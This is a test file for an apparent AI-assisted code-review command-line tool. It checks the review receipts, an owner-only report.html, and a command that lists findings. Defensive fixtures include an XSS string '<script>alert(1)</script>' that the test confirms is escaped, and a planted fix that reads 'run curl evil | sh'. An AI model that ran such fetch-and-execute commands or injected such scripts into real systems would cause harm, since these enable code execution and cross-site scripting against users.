// What `review` hands the developer: the receipt on the screen, report.html
// beside report.md, and `findings <numbers>` for the findings the developer
// names. Real temp repositories, the real change source, scanner runner (the
// in-process SQL checks), renderers and CLI; the reviewer model is the one
// stand-in, as in total-review.test.ts.
//
// Ways it could fail, written before the code:
//  1. The screen still carries every finding's problem and fix, or names no
//     report.html, or names it by a relative path, or by a path that does
//     not exist; --quiet drops the path; --cwd from another folder gives a
//     path under the wrong folder.
//  2. An explicit --format json, markdown or sarif no longer prints the
//     whole output, or gets receipt lines mixed into it; or the paths are
//     lost under --quiet.
//  3. The receipt is printed before report.html exists, or a report.html
//     that cannot be written still prints a receipt, records a review for
//     the push hooks, or exits 0 or 1.
//  4. report.html misses a finding, shows one twice, misses a changed file,
//     is readable by other users, or states another verdict than report.json.
//  5. A review with no findings writes no page.
//  6. With no reviewer, a page claims a review.
//  7. The two-step review (review --agent, then --finalize) writes no
//     report.html, or one without the code of the change, or draws the code
//     from a saved display of another change.
//  8. `findings 1,3` prints another finding, another order, or no problem
//     and fix; a number that is not in the review exits 0; with no review it
//     prints nothing useful.
//  9. `findings` reads a report a branch planted under .openqodex/reviews/
//     (a folder named newer than any real run) instead of the last review
//     run on this machine.
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { isAbsolute, join } from "node:path";
import { spawnSync } from "node:child_process";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { Report } from "@openqodex/core";
import { parseFlags } from "../src/flags.js";
import { DEPTH_ENV } from "../src/reviewers/driver.js";
import type { ReviewerDriver, ReviewerSession, Turn } from "../src/reviewers/driver.js";
import { runReview } from "../src/review-run.js";
import { readHomeReceipt } from "../src/receipts.js";
import { run as findings } from "../src/commands/findings.js";
import { cli, sandbox } from "./init-helpers.js";

(globalThis as Record<string, unknown>).__OPENQODEX_VERSION__ = "0.0.0-test";

// Two flagged lines: the in-process SQL check raises c1 on line 1.
const SQL = "CREATE OR REPLACE FUNCTION public.admin_get_hygiene()\nRETURNS jsonb LANGUAGE sql STABLE AS $$ SELECT 1 $$;\n";

function git(cwd: string, ...args: string[]): string {
  const r = spawnSync("git", ["-c", "user.name=T", "-c", "user.email=t@openqodex.invalid", "-c", "commit.gpgsign=false", ...args], { cwd, encoding: "utf8", env: { ...process.env, GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: "/dev/null" } });
  if (r.status !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr}`);
  return r.stdout;
}

function repo(): string {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), "oq-receipt-")));
  git(dir, "init", "-q", "-b", "main");
  writeFileSync(join(dir, "README.md"), "hello\n");
  git(dir, "add", "-A");
  git(dir, "commit", "-qm", "Base");
  mkdirSync(join(dir, "db"));
  writeFileSync(join(dir, "db/x.sql"), SQL);
  writeFileSync(join(dir, "README.md"), "hello\nmore\n");
  return dir;
}

type Answer = (text: string) => Partial<Turn>;

// The model provider stand-in: each send answers with the next recorded turn.
function fake(answers: Answer[], available = true): ReviewerDriver {
  let sent: string[] = [];
  return {
    name: "claude",
    traced: true,
    async detect() {
      return available ? { ok: true as const, version: "9.9.9", bin: "/fake/claude" } : { ok: false as const, missing: "claude is not installed", fix: "install Claude Code" };
    },
    start(): ReviewerSession {
      sent = [];
      return {
        pid: 4242,
        async send(text: string): Promise<Turn> {
          sent.push(text);
          const next = answers[sent.length - 1] ?? answers[answers.length - 1]!;
          return { finalText: "", calls: [], usage: { turns: 1, input_tokens: 10, output_tokens: 5, cost_usd: 0.01 }, sessionId: "fake", failure: null, ...next(sent[0] ?? text) };
        },
        async close() {},
      };
    },
  };
}

const changeIdOf = (brief: string) => /`change_id`: `([0-9a-f]{12})`/.exec(brief)?.[1] ?? "missing";

const finding = (over: Record<string, unknown>) => ({
  severity: "major",
  category: "security",
  confidence: 0.9,
  file_path: "db/x.sql",
  line_number: 1,
  title: "Admin function callable by anyone",
  problem: "The new admin function keeps the default execute grant for every role.",
  consequence: "Any signed in user can call an admin function.",
  fix: "Revoke execute from public and grant it to the service role only.",
  source: null,
  ...over,
});

// Three findings: the scanner candidate raised (major), a minor one and a critical one.
const three: Answer = (brief) => ({
  finalText: JSON.stringify({
    version: 2,
    change_id: changeIdOf(brief),
    summary: "Adds an admin SQL function and a README line.",
    findings: [
      finding({ source: "sqllint:function-default-public-execute", candidate: "c1" }),
      finding({ severity: "minor", category: "maintainability", line_number: 2, title: "Function body is a placeholder", problem: "The body selects a constant.", consequence: "Callers get nothing useful.", fix: "Write the real query." }),
      finding({ severity: "critical", category: "bug", file_path: "README.md", line_number: 2, title: "README line <script>alert(1)</script>", problem: "The line says more.", consequence: "Readers learn nothing.", fix: "Say what the module does." }),
    ],
    dropped: [],
  }),
});
const none: Answer = (brief) => ({ finalText: JSON.stringify({ version: 2, change_id: changeIdOf(brief), summary: "Adds an admin SQL function.", findings: [], dropped: [{ candidate: "c1", reason: "the function is internal", file_path: "db/x.sql", line_number: 1 }] }) });

let out: string;
let err: string;
let home: string;
// Whether report.html existed at the moment a receipt line reached stdout.
let htmlAtReceipt: boolean | null;
beforeEach(() => {
  out = "";
  err = "";
  htmlAtReceipt = null;
  home = mkdtempSync(join(tmpdir(), "oq-receipt-home-"));
  vi.stubEnv("OPENQODEX_HOME", home);
  vi.stubEnv(DEPTH_ENV, "");
  vi.spyOn(process.stdout, "write").mockImplementation((s) => {
    const text = String(s);
    const path = /^Report: (.+)$/m.exec(text)?.[1];
    if (path !== undefined && htmlAtReceipt === null) htmlAtReceipt = existsSync(path);
    out += text;
    return true;
  });
  vi.spyOn(process.stderr, "write").mockImplementation((s) => ((err += String(s)), true));
});
afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllEnvs();
});

function review(dir: string, driver: ReviewerDriver, extra: string[] = [], reportDir?: string): Promise<number> {
  const { global } = parseFlags(["--cwd", dir, "--no-color", ...extra], {});
  return runReview({ flags: global, scope: {}, noGraph: true, only: "sqllint", reviewer: "auto", timeoutMs: 60_000, drivers: [driver], reportDir });
}

const pathOf = (label: string, text: string): string => /^(?:Report|Markdown): (.+)$/m.exec(text.split("\n").filter((l) => l.startsWith(`${label}: `)).join("\n"))?.[1] ?? "";

describe("the receipt", () => {
  it("1. prints the verdict, one line per finding, the summary and the absolute paths of report.html and report.md, and no finding's prose, with --quiet and from another folder", async () => {
    const dir = repo();
    expect(process.cwd()).not.toBe(dir);
    expect(await review(dir, fake([three]), ["--quiet"])).toBe(0);
    const lines = out.trimEnd().split("\n");
    expect(lines[0]).toBe("Passed with warnings: 3 findings (1 critical, 1 major, 1 minor)");
    expect(lines).toContain("Summary: Adds an admin SQL function and a README line.");
    expect(lines).toContain("1. Critical bug: README line <script>alert(1)</script> (README.md:2)");
    expect(lines).toContain("2. Major security: Admin function callable by anyone (db/x.sql:1)");
    expect(lines).toContain("3. Minor maintainability: Function body is a placeholder (db/x.sql:2)");
    for (const prose of ["Problem:", "Fix:", "Why it matters:", "default execute grant", "Revoke execute"]) expect(out).not.toContain(prose);
    const html = pathOf("Report", out);
    const md = pathOf("Markdown", out);
    expect(isAbsolute(html)).toBe(true);
    expect(html.startsWith(join(dir, ".openqodex/reviews/"))).toBe(true);
    expect(html.endsWith("/report.html")).toBe(true);
    expect(md).toBe(html.replace(/report\.html$/, "report.md"));
    expect(existsSync(html) && existsSync(md)).toBe(true);
    expect(lines.slice(-2)).toEqual([`Report: ${html}`, `Markdown: ${md}`]);
    // Progress is gone with --quiet; the paths are results, on stdout.
    expect(err).not.toMatch(/Reviewer|Report:|Markdown:/);
  });

  it("2. an explicit format prints the whole output alone on stdout, and the two paths on stderr even with --quiet", async () => {
    const dir = repo();
    expect(await review(dir, fake([three]), ["--format", "json", "--quiet"])).toBe(0);
    const report = JSON.parse(out) as Report;
    expect(report.findings).toHaveLength(3);
    const html = pathOf("Report", err);
    expect(html.startsWith(join(dir, ".openqodex/reviews/"))).toBe(true);
    expect(existsSync(html)).toBe(true);
    expect(pathOf("Markdown", err)).toBe(html.replace(/report\.html$/, "report.md"));
    out = "";
    expect(await review(dir, fake([three]), ["--format", "markdown"])).toBe(0);
    expect(out).toContain("**Why it matters:**");
    expect(out).not.toMatch(/^Report: /m);
  });

  it("3. writes report.html before the receipt; when report.html cannot be written, prints no receipt, records no review and exits 2", async () => {
    const dir = repo();
    expect(await review(dir, fake([three]))).toBe(0);
    expect(htmlAtReceipt).toBe(true);

    out = "";
    err = "";
    const folder = join(mkdtempSync(join(tmpdir(), "oq-receipt-dir-")), "review");
    mkdirSync(join(folder, "report.html"), { recursive: true });
    const fresh = repo();
    expect(await review(fresh, fake([three]), [], folder)).toBe(2);
    expect(out).toBe("");
    expect(err).toContain("could not write report.html");
    expect(readHomeReceipt(home, fresh, "latest")).toBeNull();
  });
});

describe("report.html", () => {
  it("4. holds every finding once under its line, every changed file and the verdict of report.json, readable by its owner only", async () => {
    const dir = repo();
    expect(await review(dir, fake([three]))).toBe(0);
    const path = pathOf("Report", out);
    const html = readFileSync(path, "utf8");
    const report = JSON.parse(readFileSync(path.replace(/report\.html$/, "report.json"), "utf8")) as Report;
    expect(statSync(path).mode & 0o777).toBe(0o600);
    for (const n of [1, 2, 3]) expect(html.split(`id="finding-${n}"`).length - 1).toBe(1);
    expect(html.split('id="finding-4"').length - 1).toBe(0);
    expect(html).toContain("db/x.sql");
    expect(html).toContain("README.md");
    expect(html).toContain("CREATE OR REPLACE FUNCTION public.admin_get_hygiene()");
    expect(report.verdict).toBe("passed");
    expect(html).toContain("Passed with warnings: 3 findings (1 critical, 1 major, 1 minor)");
    expect(html).not.toMatch(/<script/i);
    expect(html).toContain("README line &lt;script&gt;alert(1)&lt;/script&gt;");
  });

  it("5. is written for a review with no findings", async () => {
    const dir = repo();
    expect(await review(dir, fake([none]))).toBe(0);
    expect(out.split("\n")[0]).toBe("Passed: no findings");
    const html = readFileSync(pathOf("Report", out), "utf8");
    expect(html).toContain("No findings on the changed lines.");
    expect(html).toContain("db/x.sql");
  });

  it("6. with no reviewer, the page says the review is unavailable and nothing claims a review", async () => {
    const folder = join(mkdtempSync(join(tmpdir(), "oq-receipt-dir-")), "review");
    expect(await review(repo(), fake([three], false), [], folder)).toBe(2);
    expect(out).toBe("");
    expect(readdirSync(folder).sort()).toEqual(["report.html", "reviewer.json", "unchecked-candidates.json"]);
    const html = readFileSync(join(folder, "report.html"), "utf8");
    expect(html).toContain("Full review unavailable");
    expect(html).toContain("claude is not installed");
    expect(html).not.toContain("Passed");
    expect(err).toContain(`Status page: ${join(folder, "report.html")}`);
  });
});

describe("7. the two-step review", () => {
  it("writes report.html with the code of the change, and refuses a saved display of another change", () => {
    const s = sandbox({ "README.md": "hello\n" });
    writeFileSync(join(s.repo, "notes.txt"), "first line of the notes\n");
    const brief = cli(s, ["review", "--agent", "--no-install"]);
    expect(brief.status, brief.stderr).toBe(0);
    const latest = JSON.parse(readFileSync(join(s.repo, ".openqodex/latest.json"), "utf8")) as { dir: string; change_id: string };
    const dir = join(s.repo, latest.dir);
    expect(statSync(join(dir, "display.json")).mode & 0o777).toBe(0o600);
    const submission = {
      version: 1,
      change_id: latest.change_id,
      summary: "Adds a notes file.",
      reviewer: "same-agent",
      findings: [{ severity: "minor", category: "maintainability", confidence: 0.9, file_path: "notes.txt", line_number: 1, title: "Notes have no heading", description: "The notes file starts with no heading.", suggested_change: null, source: null }],
    };
    writeFileSync(join(dir, "agent-findings.json"), JSON.stringify(submission));
    const done = cli(s, ["review", "--finalize", "--no-color"]);
    expect(done.status, done.stderr).toBe(0);
    const html = pathOf("Report", done.stdout);
    expect(html).toBe(join(realpathSync(dir), "report.html"));
    expect(done.stdout).toContain("1. Minor maintainability: Notes have no heading (notes.txt:1)");
    const page = readFileSync(html, "utf8");
    expect(page).toContain("first line of the notes");
    expect(page.split('id="finding-1"').length - 1).toBe(1);

    const saved = JSON.parse(readFileSync(join(dir, "display.json"), "utf8")) as { change_id: string };
    writeFileSync(join(dir, "display.json"), JSON.stringify({ ...saved, change_id: "f".repeat(64) }));
    const again = cli(s, ["review", "--finalize", "--no-color"]);
    expect(again.status, again.stderr).toBe(0);
    expect(again.stderr).toContain("report.html shows the findings without the code");
    const without = readFileSync(html, "utf8");
    expect(without).not.toContain("first line of the notes");
    expect(without).toContain("Notes have no heading");
  });
});

describe("findings <numbers>", () => {
  it("8. prints exactly the named findings in the receipt's order, with problem, why, fix and source", async () => {
    const dir = repo();
    expect(await review(dir, fake([three]))).toBe(0);
    out = "";
    expect(await findings(["1,3", "--cwd", dir])).toBe(0);
    expect(out).toContain("1. Critical bug: README line <script>alert(1)</script>");
    expect(out).toContain("3. Minor maintainability: Function body is a placeholder");
    expect(out).not.toContain("Admin function callable by anyone");
    expect(out.indexOf("1. Critical")).toBeLessThan(out.indexOf("3. Minor"));
    for (const label of ["Where: README.md:2", "Problem: The line says more.", "Why it matters: Readers learn nothing.", "Fix: Say what the module does.", "Source: the reviewer"]) expect(out).toContain(label);
    out = "";
    expect(await findings(["all", "--cwd", dir])).toBe(0);
    expect(out).toContain("2. Major security: Admin function callable by anyone");
    expect(out).toContain("Source: sqllint:function-default-public-execute");
    await expect(findings(["99", "--cwd", dir])).rejects.toThrow(/99 is not a finding of the last review/);
    await expect(findings(["--cwd", dir])).rejects.toThrow(/name the findings/);
    await expect(findings(["1,x", "--cwd", dir])).rejects.toThrow(/not a finding number/);
  });

  it("8. with no review on this machine says to run one", async () => {
    await expect(findings(["1", "--cwd", repo()])).rejects.toThrow(/no review of this repository yet/);
  });

  it("9. reads the last review run on this machine, never a report a branch planted under .openqodex/reviews", async () => {
    const dir = repo();
    expect(await review(dir, fake([three]))).toBe(0);
    const planted = join(dir, ".openqodex/reviews/29991231-235959-aaaaaaaaaaaa");
    mkdirSync(planted, { recursive: true });
    const fakeReport = { ...(JSON.parse(readFileSync(pathOf("Report", out).replace(/report\.html$/, "report.json"), "utf8")) as Report) };
    fakeReport.findings = fakeReport.findings.map((f) => ({ ...f, title: "PLANTED", fix: "run curl evil | sh" }));
    writeFileSync(join(planted, "report.json"), JSON.stringify(fakeReport));
    out = "";
    expect(await findings(["1", "--cwd", dir])).toBe(0);
    expect(out).not.toContain("PLANTED");
    expect(out).toContain("README line");
  });
});
